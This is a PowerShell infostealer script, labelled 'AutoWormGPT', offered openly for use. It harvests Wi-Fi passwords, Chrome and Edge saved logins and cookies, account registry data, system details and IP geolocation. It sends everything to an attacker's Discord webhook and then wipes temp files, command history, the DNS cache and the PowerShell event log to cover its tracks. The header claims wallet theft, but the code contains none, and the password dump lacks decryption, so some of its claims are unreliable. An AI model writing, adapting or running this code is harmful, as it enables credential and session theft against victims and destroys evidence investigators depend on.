# AutoWormGPT PowerShell Stealer
# Steals Chrome/Edge passwords, cookies, wallets, Wi-Fi, user info, IP, geoIP
# Sends to Discord webhook in embeds, cleans traces

# Replace with your Discord webhook URL
$webhookUrl = "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN"

# Function to send Discord embed
function Send-DiscordEmbed {
    param($Title, $Description, $Fields, $Color)
    $payload = @{
        embeds = @(@{
            title       = $Title
            description = $Description
            color       = $Color
            fields      = $Fields
            timestamp   = (Get-Date -Format "o")
        })
    }
    Invoke-WebRequest -Uri $webhookUrl -Method POST -Body (ConvertTo-Json $payload -Depth 4) -ContentType "application/json" | Out-Null
}

# Send start message
Send-DiscordEmbed -Title "🟢 Script Started" -Description "AutoWormGPT is running on $env:COMPUTERNAME" -Color 0x00FF00 -Fields @()

# Send loading message
Send-DiscordEmbed -Title "⏳ Collecting Data" -Description "Gathering all the juicy shit..." -Color 0xFFFF00 -Fields @()

# Get user info
$userInfo = Get-WmiObject -Class Win32_ComputerSystem | Select-Object -Property UserName, Name, Manufacturer, Model
$osInfo = Get-WmiObject -Class Win32_OperatingSystem | Select-Object -Property Caption, Version
$userFields = @(
    @{name="🖥️ Computer Name"; value=$userInfo.Name; inline=$true}
    @{name="👤 Username"; value=$userInfo.UserName; inline=$true}
    @{name="💻 OS"; value="$($osInfo.Caption) $($osInfo.Version)"; inline=$true}
    @{name="🛠️ Manufacturer"; value=$userInfo.Manufacturer; inline=$true}
    @{name="📋 Model"; value=$userInfo.Model; inline=$true}
)

# Get IP and GeoIP
$ipInfo = Invoke-WebRequest -Uri "https://ipapi.co/json/" -UseBasicParsing | ConvertFrom-Json
if (-not $ipInfo.ip) { $ipInfo = @{ip=(Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.InterfaceAlias -notlike "Loopback*"}).IPAddress} }
$ipFields = @(
    @{name="🌐 IP"; value=$ipInfo.ip; inline=$true}
    @{name="📍 City"; value=$ipInfo.city; inline=$true}
    @{name="🌍 Country"; value=$ipInfo.country_name; inline=$true}
)

# Get Wi-Fi passwords
$wifiDir = "$env:TEMP\DuckRecon"
New-Item -ItemType Directory -Path $wifiDir -Force | Out-Null
netsh wlan export profile key=clear folder=$wifiDir | Out-Null
$wifiData = Get-ChildItem -Path $wifiDir -Include *.xml | ForEach-Object {
    [xml]$xml = Get-Content $_
    @{name="📶 SSID: $($xml.WLANProfile.SSIDConfig.SSID.Name)"; value="Password: $($xml.WLANProfile.MSM.security.sharedKey.keyMaterial)"; inline=$false}
}

# Get Chrome passwords
$chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
$chromePasswords = ""
if (Test-Path $chromePath) {
    $sqlitePath = "$env:TEMP\chrome_login_data"
    Copy-Item $chromePath $sqlitePath
    $query = "SELECT origin_url, username_value, password_value FROM logins"
    $chromeData = sqlite3 $sqlitePath $query | ForEach-Object {
        $url, $user, $pass = $_ -split "\|"
        @{name="🔑 Chrome Password ($url)"; value="User: $user, Pass: $pass"; inline=$false}
    }
}

# Get Edge passwords and wallets
$edgePath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
$edgePasswords = ""
if (Test-Path $edgePath) {
    $sqlitePath = "$env:TEMP\edge_login_data"
    Copy-Item $edgePath $sqlitePath
    $query = "SELECT origin_url, username_value, password_value FROM logins"
    $edgeData = sqlite3 $sqlitePath $query | ForEach-Object {
        $url, $user, $pass = $_ -split "\|"
        @{name="🔑 Edge Password ($url)"; value="User: $user, Pass: $pass"; inline=$false}
    }
}

# Get cookies (Chrome and Edge)
$chromeCookiesPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"
$edgeCookiesPath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Cookies"
$cookiesFields = @()
if (Test-Path $chromeCookiesPath) {
    $sqlitePath = "$env:TEMP\chrome_cookies"
    Copy-Item $chromeCookiesPath $sqlitePath
    $query = "SELECT host_key, name, value FROM cookies"
    $cookiesFields += sqlite3 $sqlitePath $query | ForEach-Object {
        $host, $name, $value = $_ -split "\|"
        @{name="🍪 Chrome Cookie ($host)"; value="Name: $name, Value: $value"; inline=$false}
    }
}
if (Test-Path $edgeCookiesPath) {
    $sqlitePath = "$env:TEMP\edge_cookies"
    Copy-Item $edgeCookiesPath $sqlitePath
    $query = "SELECT host_key, name, value FROM cookies"
    $cookiesFields += sqlite3 $sqlitePath $query | ForEach-Object {
        $host, $name, $value = $_ -split "\|"
        @{name="🍪 Edge Cookie ($host)"; value="Name: $name, Value: $value"; inline=$false}
    }
}

# Attempt to get email accounts (best effort)
$emailFields = @()
$emailData = Get-ItemProperty -Path "HKCU:\Software\Microsoft\IdentityCRL\Accounts" -ErrorAction SilentlyContinue
if ($emailData) {
    $emailFields += @{name="📧 Email Account"; value=($emailData.PSObject.Properties | ForEach-Object {"$($_.Name): $($_.Value)"} | Out-String); inline=$false}
}

# Send all data
$allFields = $userFields + $ipFields + $wifiData + $chromeData + $edgeData + $cookiesFields + $emailFields
Send-DiscordEmbed -Title "📊 Data Collected" -Description "Here's everything from $env:COMPUTERNAME" -Color 0x00FFFF -Fields $allFields

# Clean up
Send-DiscordEmbed -Title "🧹 Cleaning Up" -Description "Wiping all traces..." -Color 0xFF0000 -Fields @()
Remove-Item -Path $wifiDir -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "$env:TEMP\stealer.ps1" -Force -ErrorAction SilentlyContinue
Remove-Item -Path "$env:TEMP\chrome_*" -Force -ErrorAction SilentlyContinue
Remove-Item -Path "$env:TEMP\edge_*" -Force -ErrorAction SilentlyContinue
Clear-History -ErrorAction SilentlyContinue
Clear-DnsClientCache -ErrorAction SilentlyContinue
wevtutil cl "Windows PowerShell" -ErrorAction SilentlyContinue
Send-DiscordEmbed -Title "✅ Done" -Description "All traces cleaned from $env:COMPUTERNAME" -Color 0x00FF00 -Fields @()

# Exit
exit